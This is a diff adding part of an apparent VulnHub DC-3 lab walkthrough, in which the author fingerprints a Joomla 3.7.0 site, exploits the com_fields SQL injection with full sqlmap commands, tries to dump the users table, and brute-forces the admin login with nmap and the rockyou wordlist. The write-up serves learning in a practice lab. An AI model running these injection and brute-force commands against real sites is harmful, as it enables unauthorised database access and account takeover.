@@ -40,8 +40,55 @@ visiting the site, Wappalyzer shows this is a `Joomla` cms, also cheking the tar
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d70cfbff-32d9-4a05-b39c-3f9932602930)
 
+so i visited the `/administrator` page :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b467734b-1e5e-4c24-8038-4392ad61cca1)
 
+this is actually a joomla CMS, let's find the version of it to see any exploit available
+
+there is a tool called `joomscan` that does afew enumeration :
+
+```bash
+root@kali: joomscan --url http://192.168.56.115
+```
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/9a056c02-4bd8-43a7-9f4f-4e1fa4ec87e3)
+
+you can also check for the version by visiting the below urls, but it gives an approximate version :
+
+```bash
+curl http://192.168.56.115/administrator/manifests/files/joomla.xml | grep version
+ curl http://192.168.56.115/language/en-GB/en-GB.xml | grep version
+```
+
+then in searchsploit i found afew exploits :
+
+```text
+Joomla! 3.7 - SQL Injection | php/remote/44227.php
+Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt
+```
+
+the first one `44227` did not work, but the second one guides through a valid SQLi bug, i used the command mentioned in the document :
+
+```bash
+root@kali: #sqlmap -u "http://192.168.56.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch
+```
+
+sqlmap found the database in use, `joomladb`, then i tried to dump the data out of it, but did not work since it showed an error after running the below command :
+
+```bash
+root@kali: sqlmap -u "http://192.168.56.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --T '#__users' --dump -p list[fullordering] --batch 
+```
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8b690314-3d8d-4f09-bfc2-6d0a66c713df)
+
+there must be something with the naming of the table which starts by `#`, so i went to another path and tried to brute force the admin panel
+
+i used metasploit `auxiliary/scanner/http/joomla_bruteforce_login` but my system crushed every time i used this module, so i used nmap instead
+
+put admin in user.txt
+
+```bash
+root@kali: nmap -v -sV --script http-joomla-brute --script-args 'userdb=/root/ctf/dc-3/user.txt,passdb=/usr/share/wordlists/rockyou.txt,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.56.115
+```
 
 
 
